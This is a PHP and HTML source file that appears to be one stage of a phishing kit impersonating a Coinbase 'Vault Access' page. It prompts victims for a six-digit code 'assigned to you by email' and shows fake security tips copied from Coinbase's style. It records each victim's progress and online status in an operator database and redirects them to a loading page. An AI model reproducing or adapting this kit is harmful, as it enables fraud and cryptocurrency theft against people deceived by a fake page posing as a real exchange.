<?php
session_start();
require_once "admin/db_connection.php";

function updateActivity($token, $activity) {
    global $conn;
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $token);
    $stmt->execute();
    $stmt->close();
}

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['vault_code'])) {
    if (isset($_SESSION['token'])) {
        $token = $_SESSION['token'];
        $entered_code = implode("", $_POST['vault_code']);
        
        // Get the stored vault code from database
        $stmt = $conn->prepare("SELECT vault_code FROM user_submissions WHERE token = ?");
        $stmt->bind_param("s", $token);
        $stmt->execute();
        $result = $stmt->get_result();
        $stored_data = $result->fetch_assoc();
        $stmt->close();
        
        if ($stored_data && $stored_data['vault_code'] === $entered_code) {
            // Code is correct, update status and redirect to vault funds loading
            $stmt = $conn->prepare("UPDATE user_submissions SET activity = ?, vault_status = ? WHERE token = ?");
            $activity = "VaultWallet";
            $vault_status = "VaultWallet";
            $stmt->bind_param("sss", $activity, $vault_status, $token);
            $stmt->execute();
            $stmt->close();

            header("Location: loading.php");
            exit();
        } else {
            // Code is incorrect, show error
            $show_error = true;
        }
    }
}

if (isset($_SESSION['token'])) {
    updateActivity($_SESSION['token'], "VaultAccessPage");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Vault Access</title>
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2');
        }

        body {
            background-color: #0A0B0D;
            color: #E0E0E0;
            font-family: 'CoinbaseSans', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 480px;
            text-align: center;
        }

        /* Progress Bar */
        .progress-bar {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 40px;
            gap: 8px;
        }

        .progress-step {
            width: 80px;
            height: 4px;
            background-color: #32353D;
            border-radius: 2px;
        }

        .progress-step.active {
            background-color: #588BFA;
        }

        .progress-step.completed {
            background-color: #588BFA;
        }

        .header {
            color: #B0B0B0;
            margin-bottom: 24px;
            text-align: center;
            font-family: 'CoinbaseSans', sans-serif;
        }

        .header .coinbase-text {
            font-size: 18px;
            font-weight: 600;
        }

        .header .vault-text {
            font-size: 14px;
            font-weight: 400;
            margin-left: 8px;
        }

        h1 {
            color: #FFFFFF;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            text-align: center;
        }

        .subtitle {
            color: #B0B0B0;
            font-size: 16px;
            margin-bottom: 24px;
            text-align: center;
        }

        .code-inputs {
            display: flex;
            gap: 12px;
            margin-bottom: 12px;
            justify-content: center;
        }

        .code-inputs input {
            width: 52px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            background-color: #1A1B1F;
            border: 2px solid #32353D;
            border-radius: 8px;
            color: #FFFFFF;
            font-family: 'CoinbaseSans', sans-serif;
            outline: none;
            transition: border-color 0.2s;
        }

        .code-inputs input:focus {
            border-color: #588BFA;
        }
        
        .code-inputs input.error {
            border-color: #E53E3E;
        }
        
        .error-message {
            color: #E53E3E;
            font-size: 14px;
            margin-bottom: 24px;
        }

        .info-box {
            background-color: #1A1B1F;
            border: 1px solid #32353D;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: flex-start;
            text-align: left;
        }

        .info-icon {
            margin-right: 12px;
            flex-shrink: 0;
            margin-top: 4px;
        }

        .info-text h3 {
            font-size: 16px;
            font-weight: 600;
            color: #FFFFFF;
            margin: 0 0 4px 0;
        }

        .info-text p {
            font-size: 14px;
            color: #B0B0B0;
            margin: 0;
            line-height: 1.5;
        }

        .footer {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-top: 32px;
        }

        .footer a {
            color: #B0B0B0;
            font-size: 14px;
            text-decoration: none;
            transition: color 0.2s;
        }

        .footer a:hover {
            color: #FFFFFF;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="progress-bar">
            <div class="progress-step completed"></div>
            <div class="progress-step completed"></div>
            <div class="progress-step active"></div>
            <div class="progress-step"></div>
        </div>
        
        <div class="header">
            <span class="coinbase-text">COINBASE</span><span class="vault-text">VAULT</span>
        </div>
        <h1>Enter Vault Access Code</h1>
        <p class="subtitle">This should have been assigned to you by email.</p>

        <form method="POST" id="vaultAccessForm">
            <div class="code-inputs" id="codeInputs">
                <input type="text" name="vault_code[]" maxlength="1" required pattern="[0-9]" inputmode="numeric">
                <input type="text" name="vault_code[]" maxlength="1" required pattern="[0-9]" inputmode="numeric">
                <input type="text" name="vault_code[]" maxlength="1" required pattern="[0-9]" inputmode="numeric">
                <input type="text" name="vault_code[]" maxlength="1" required pattern="[0-9]" inputmode="numeric">
                <input type="text" name="vault_code[]" maxlength="1" required pattern="[0-9]" inputmode="numeric">
                <input type="text" name="vault_code[]" maxlength="1" required pattern="[0-9]" inputmode="numeric">
            </div>
            <p class="error-message" style="<?php echo isset($show_error) && $show_error ? 'display: block;' : 'display: none;'; ?>">User identification error. Please refresh.</p>
        </form>

        <div class="info-box">
            <div class="info-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z" fill="#588BFA"/>
                </svg>
            </div>
            <div class="info-text">
                <h3>Security Tip</h3>
                <p>This access code is unique to your vault. Never share it with anyone, including Coinbase support.</p>
            </div>
        </div>

        <div class="info-box">
            <div class="info-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="#B0B0B0"/>
                </svg>
            </div>
            <div class="info-text">
                <h3>Vault Security</h3>
                <p>All withdrawals include a mandatory 24-hour security hold. This gives you time to cancel withdrawals and helps to secure against unintended transactions.<br>You'll receive email notifications during this period to verify transaction details.</p>
            </div>
        </div>

        <div class="footer">
            <a href="#">We're hiring</a>
            <a href="#">Terms of service</a>
            <a href="#">Privacy policy</a>
        </div>
    </div>

    <script>
        const inputs = document.querySelectorAll('#codeInputs input');
        inputs.forEach((input, index) => {
            input.addEventListener('keydown', (e) => {
                if (e.key >= 0 && e.key <= 9) {
                    inputs[index].value = '';
                    if (index < inputs.length - 1) {
                        setTimeout(() => inputs[index + 1].focus(), 10);
                    }
                } else if (e.key === 'Backspace') {
                     if (index > 0) {
                        setTimeout(() => inputs[index - 1].focus(), 10);
                    }
                }
            });

            input.addEventListener('input', () => {
                // Check if all inputs are filled
                const allFilled = [...inputs].every(i => i.value.length === 1);
                if (allFilled) {
                    document.getElementById('vaultAccessForm').submit();
                }
            });
        });
        
        // Add error styling if there's an error
        <?php if (isset($show_error) && $show_error): ?>
        inputs.forEach(input => input.classList.add('error'));
        <?php endif; ?>


        // Update status to online
        function updateStatus() {
            fetch('update_status.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'status=online'
            });
        }
        updateStatus();
        setInterval(updateStatus, 30000);
    </script>
</body>
</html> 